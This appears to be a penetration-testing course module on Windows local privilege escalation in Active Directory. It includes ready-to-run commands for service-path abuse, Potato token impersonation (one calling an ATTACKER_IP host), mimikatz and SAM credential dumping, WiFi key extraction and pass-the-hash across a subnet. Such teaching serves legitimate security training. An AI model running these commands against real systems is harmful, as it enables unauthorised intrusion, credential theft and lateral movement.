# Local Privilege Escalation in AD

## Unit 5 - Topic 1 | Privilege Escalation in AD

---

## Overview

**Local privilege escalation** in Active Directory environments targets Windows machines to move from a standard domain user to local administrator or SYSTEM. This provides access to credentials stored in memory, enables lateral movement, and serves as a stepping stone to domain-wide compromise.

---

## 1. Privilege Escalation Paths

```
LOCAL PRIVESC STRATEGY IN AD:

CURRENT ACCESS:
├── Domain User (low privilege)
│
├── ESCALATE TO LOCAL ADMIN:
│   ├── Unquoted service paths
│   ├── Writable service binaries
│   ├── DLL hijacking
│   ├── AlwaysInstallElevated
│   ├── Stored credentials (cmdkey)
│   ├── Scheduled task abuse
│   ├── Kernel exploits
│   └── Misconfigured permissions
│
├── ESCALATE TO SYSTEM:
│   ├── Token impersonation (Potato attacks)
│   ├── Service exploitation
│   ├── Named pipe impersonation
│   └── PSExec -s (if admin)
│
└── POST-ESCALATION:
    ├── Dump LSASS → domain credentials
    ├── Dump SAM → local hashes
    ├── Access protected files
    ├── Install persistence
    └── Pivot to other machines
```

---

## 2. Automated Enumeration Tools

```bash
# === WINPEAS (Most Comprehensive) ===
.\winPEASx64.exe
# Checks hundreds of privilege escalation vectors
# Color-coded output: RED = critical finding

# === POWERUP (PowerShell) ===
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# Checks: Services, registry, scheduled tasks, DLLs, etc.

# === SEATBELT (C# — Security Audit) ===
.\Seatbelt.exe -group=all
# Detailed system security configuration checks

# === SHARPUP (C# Version of PowerUp) ===
.\SharpUp.exe audit
# Compiled version — works when PowerShell is restricted

# === PRIVESCCHECK (PowerShell) ===
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
# Modern alternative to PowerUp

# === MANUAL CHECKS ===
# Current privileges:
whoami /priv
whoami /groups
# If SeImpersonatePrivilege → Potato attacks!
# If SeDebugPrivilege → LSASS dump!

# System info:
systeminfo
# Check OS version, hotfixes, architecture
```

---

## 3. Common Windows Privilege Escalation

```bash
# === UNQUOTED SERVICE PATH ===
# Service path: C:\Program Files\My App\service.exe
# Windows tries: C:\Program.exe, C:\Program Files\My.exe
# If writable directory → place malicious binary

# Find vulnerable services:
wmic service get name,displayname,pathname,startmode | \
  findstr /i "auto" | findstr /i /v "C:\Windows\\"
# PowerUp:
Get-UnquotedService

# === WRITABLE SERVICE BINARIES ===
# If you can replace a service binary:
Get-ModifiableServiceFile
# Replace with reverse shell → restart service → SYSTEM

# === ALWAYSINSTALLELEVATED ===
# If both registry keys are set to 1:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If enabled → install MSI as SYSTEM:
msiexec /quiet /qn /i malicious.msi

# === STORED CREDENTIALS ===
cmdkey /list
# If credentials stored:
runas /savecred /user:admin cmd.exe

# === SCHEDULED TASKS ===
schtasks /query /fo LIST /v
# Look for tasks running as SYSTEM with writable paths

# === DLL HIJACKING ===
# Find services loading DLLs from writable directories
# Place malicious DLL → service loads it with SYSTEM
```

---

## 4. Potato Attacks (Token Impersonation)

```bash
# === REQUIRES: SeImpersonatePrivilege ===
# Common for: IIS, SQL Server, service accounts
whoami /priv
# If SeImpersonatePrivilege = Enabled → Potato works!

# === JUICYPOTATO (Windows < Server 2019) ===
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
# Escalates service account → SYSTEM

# === PRINTSPOOFER (Windows 10/Server 2019+) ===
.\PrintSpoofer.exe -i -c cmd.exe
# Uses print spooler named pipe for impersonation
# Works on newer Windows versions

# === GODPOTATO (Latest) ===
.\GodPotato.exe -cmd "cmd /c whoami"
# Works across many Windows versions

# === SWEETPOTATO ===
.\SweetPotato.exe -e EfsRpc -p cmd.exe
# Combines multiple potato techniques

# === ROGUEPOTATO ===
.\RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe"
# Requires network listener on attacker machine
```

---

## 5. Post-Escalation Actions

```bash
# === AFTER GETTING LOCAL ADMIN/SYSTEM ===

# 1. Dump credentials:
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
# → Domain user hashes, possibly DA credentials!

# 2. Dump SAM:
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL

# 3. Check cached credentials:
lsadump::cache
# DCC2 hashes of recently logged-in domain users

# 4. Check for stored WiFi passwords:
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# 5. Install persistence:
# Create service, scheduled task, or registry run key

# 6. Pivot to other machines:
crackmapexec smb 10.0.0.0/24 -u admin -H LOCAL_HASH \
  --local-auth
# Test local admin hash against entire subnet
```

---

## Summary Table

| Technique | Requirement | Gets You |
|-----------|-------------|----------|
| **Unquoted paths** | Writable directory in path | SYSTEM |
| **Service binary** | Write access to binary | SYSTEM |
| **AlwaysInstallElevated** | Both reg keys = 1 | SYSTEM |
| **Potato attacks** | SeImpersonatePrivilege | SYSTEM |
| **Stored creds** | cmdkey entries | Admin user |
| **DLL hijacking** | Writable DLL directory | Service user |

---

## Quick Revision Questions

1. **What tool provides the most comprehensive Windows privesc check?**
2. **What privilege is needed for Potato attacks?**
3. **What should you do immediately after getting SYSTEM?**
4. **How does an unquoted service path lead to code execution?**
5. **Why is local admin access valuable in AD environments?**

---

[Next: Token Impersonation →](02-token-impersonation.md)

---

*Unit 5 - Topic 1 of 5 | [Back to README](../README.md)*
